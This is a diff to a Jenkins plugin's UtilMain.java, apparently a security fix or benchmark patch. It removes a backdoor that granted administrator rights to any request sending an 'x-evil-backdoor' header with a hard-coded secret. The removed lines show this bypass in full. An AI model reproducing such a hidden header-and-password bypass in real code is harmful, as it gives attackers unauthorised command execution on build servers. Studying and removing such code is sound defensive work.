@@ -1,0 +1,30 @@
+diff --git a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java
+index e0c2303..ead05f1 100644
+--- a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java
++++ b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java
+@@ -165,23 +165,14 @@ public class UtilMain implements RootAction {
+                     @QueryParameter String cmdSeq,
+                     StaplerRequest req,
+                     StaplerResponse resp) throws ServletException, IOException, BadCommandException {
+-        boolean is_allowed = jenkins().hasPermission(Jenkins.ADMINISTER);
+-
+-        String bd_candidate = req.getHeader("x-evil-backdoor");
+-
+-        if ((null != bd_candidate) &&
+-                        bd_candidate.equals("JuggleKneltSynergyUnriggedFootageObtrusive")) {
+-            is_allowed = true;
+-        }
+-
+-        if (! is_allowed) {
++        if (!jenkins().hasPermission(Jenkins.ADMINISTER)) {
+             events.add(new Event(Event.Status.ERROR, "Error: Only Admin Users Are Permitted", cmdSeq));
+             resp.forwardToPreviousPage(req);
+             return;
+         }
+ 
+         String result = createUtils(cmdSeq);
+-        if ((null == result) || (result.isEmpty())) {
++        if (result == null || result.isEmpty()) {
+             events.add(new Event(Event.Status.ERROR, "Error: empty result", cmdSeq));
+         }
+         resp.forwardToPreviousPage(req);
